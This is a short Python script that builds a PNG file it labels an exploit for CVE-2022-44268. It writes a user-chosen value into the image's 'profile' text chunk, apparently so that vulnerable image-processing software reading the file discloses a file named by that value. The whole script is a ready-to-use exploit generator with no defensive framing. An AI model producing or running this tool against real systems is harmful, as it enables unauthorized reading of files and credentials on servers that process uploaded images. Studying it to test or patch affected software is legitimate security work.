#!/usr/bin/python3

import argparse
from PIL import Image, ImageDraw, PngImagePlugin

# Create image

def main(Profile_Value):

    width, height = 400, 200
    background_color = (255, 255, 255)
    image = Image.new("RGB", (width, height), background_color)

    # Save to Exploit.png
    #text = f"profile: {Profile_Value}"
    text_color = (0, 0, 0)
    font_size = 20
    image.save("Exploit.png")
    print("Explot.png Create Success")

    # Add Text "profile: Kim" into Exploit.png
    Exploit_Text = f"{Profile_Value}"
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", Exploit_Text)
    im = Image.open("Exploit.png")
    im.save("Exploit.png", "PNG", pnginfo=info)
    print(f' Add text {Profile_Value} into Exploit.png')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generate Exploit PNG File For CVE-2022-44268')
    parser.add_argument('Profile_Value', help='Profile Value information to add into the image is your want.')
    args = parser.parse_args()
    main(args.Profile_Value)
